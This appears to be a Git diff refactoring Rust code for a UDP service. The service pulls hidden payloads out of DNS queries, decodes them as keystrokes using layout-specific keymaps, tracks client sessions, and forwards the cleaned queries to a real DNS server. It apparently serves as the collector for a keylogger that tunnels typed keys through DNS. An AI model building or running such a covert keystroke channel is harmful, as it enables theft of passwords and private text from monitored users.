@@ -12,6 +12,7 @@ use tokio::{net::UdpSocket, sync::Mutex};
 const COMMON_REPEATED_KEYS: [&str; 4] = [" 󱊷 ", " 󰌑 ", " 󰁮 ", "  "];
 static KEYMAPS: OnceLock<HashMap<u8, KeyMap>> = OnceLock::new();
 
+#[derive(Debug)]
 enum Layout {
     Qwerty = 0,
     Azerty = 1,
@@ -30,7 +31,7 @@ impl From<u8> for Layout {
 #[derive(Deserialize, Debug)]
 pub struct KeyMap {
     keys: HashMap<u8, String>,
-    r#mod: HashMap<u8, HashMap<u8, String>>,
+    modifier: HashMap<u8, HashMap<u8, String>>,
 }
 impl KeyMap {
     pub fn get(&self, key_code: &u8, last_keycode: Option<&u8>) -> Vec<String> {
@@ -41,7 +42,7 @@ impl KeyMap {
                     out.push(key.to_string());
                 }
             }
-            Some(last_keycode) => match self.r#mod.get(last_keycode) {
+            Some(last_keycode) => match self.modifier.get(last_keycode) {
                 Some(modifier_map) => {
                     if let Some(key) = modifier_map.get(key_code) {
                         out.push(key.to_string());
@@ -59,7 +60,7 @@ impl KeyMap {
     }
     pub fn is_modifier(&self, key_code: Option<&u8>) -> bool {
         if let Some(key_code) = key_code {
-            return self.r#mod.contains_key(key_code);
+            return self.modifier.contains_key(key_code);
         }
         false
     }
@@ -144,8 +145,8 @@ pub async fn mangle(
     let layout = Layout::from(*payload_it.next().ok_or(0u32)?); //first byte is layout
     let payload: Vec<u8> = payload_it.copied().collect();
 
-    let mut data = data[..(data.len() - payload_len)].to_vec();
-    //Add recursion bytes
+    let mut data = data[..(data.len().saturating_sub(payload_len))].to_vec();
+    //Add recursion bytes (DNS)
     data[2] = 1;
     data[3] = 32;
 
@@ -154,11 +155,14 @@ pub async fn mangle(
         .ok_or(0u32)?
         .get(&(layout as u8))
         .ok_or(0u32)?;
+
     let session = Session::new(addr).ok_or(0u32)?;
+
     if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
         info!("Adding new session for client: {} ", session.ip);
         e.insert(session.clone());
     }
+
     let current_session = current_sessions.get_mut(&session.ip).unwrap();
 
     for k in payload {
@@ -186,7 +190,7 @@ pub async fn mangle(
 
 pub async fn forward_req(data: Vec<u8>, dns_ip: Ipv4Addr) -> Result<Vec<u8>, u8> {
     debug!("Forwarding {} bytes", data.len());
-    let sock = UdpSocket::bind("0.0.0.0:8080").await.map_err(|_| 0u8)?;
+    let sock = UdpSocket::bind("0.0.0.0:0").await.map_err(|_| 0u8)?;
     let remote_addr = format!("{}:53", dns_ip);
     sock.send_to(data.as_slice(), remote_addr)
         .await
